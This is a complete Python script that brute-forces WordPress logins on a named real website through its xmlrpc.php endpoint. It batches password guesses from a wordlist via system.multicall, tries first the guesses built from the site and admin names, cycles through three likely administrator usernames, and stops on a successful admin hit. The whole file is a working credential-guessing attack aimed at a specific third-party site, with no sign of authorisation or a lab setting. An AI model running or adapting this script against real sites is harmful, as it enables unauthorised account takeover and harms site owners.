#!/usr/bin/env python3
"""showerlee xmlrpc brute with lzyadmin"""
import urllib.request, sys

URL = "http://showerlee.com/xmlrpc.php"
pwds = [l.strip() for l in open("/tmp/sl_pass.txt") if l.strip()]
pre = [p for p in pwds if "lzy" in p.lower() or "admin" in p.lower() or "shower" in p.lower() or "lee" in p.lower()]
rest = [p for p in pwds if p not in pre]
pwds = pre + rest
print(f"total={len(pwds)} priority={len(pre)}", flush=True)

def multicall(user, batch):
    body = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for p in batch:
        body += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{user}</string></value><value><string>{p}</string></value></data></array></value></data></array></value></member></struct></value>'
    body += '</data></array></value></param></params></methodCall>'
    try:
        req = urllib.request.Request(URL, data=body.encode(), headers={"Content-Type":"text/xml"})
        r = urllib.request.urlopen(req, timeout=10).read().decode("utf-8","ignore")
        return r
    except Exception as e:
        return f"ERR:{str(e)[:30]}"

for user in ["lzyadmin", "admin", "showerlee"]:
    print(f"--- {user} ---", flush=True)
    for i in range(0, len(pwds), 20):
        batch = pwds[i:i+20]
        r = multicall(user, batch)
        if "isAdmin" in r:
            print(f"!!! HIT {user} in {batch[:4]}", flush=True)
            sys.exit(0)
        if i % 2000 == 0:
            print(f"  {i}/{len(pwds)}", flush=True)
print("DONE")
